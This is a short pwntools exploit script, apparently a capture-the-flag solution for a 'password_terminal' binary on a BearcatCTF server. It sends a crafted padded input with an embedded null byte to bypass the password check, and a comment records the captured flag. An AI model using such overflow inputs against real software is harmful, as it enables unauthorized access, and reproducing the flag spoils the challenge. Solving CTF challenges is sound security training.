#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./password_terminal_patched")

context.binary = exe

REMOTE_NC_CMD    = "nc chal.bearcatctf.io 32927"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.sendline(b"A"*17+b"\x00" + b"A"*31)
    #BCCTF{K1nDa_WI1d_p4w0Rd_Th3r3_601fd5b4}

    r.interactive()

if __name__ == "__main__":
    main()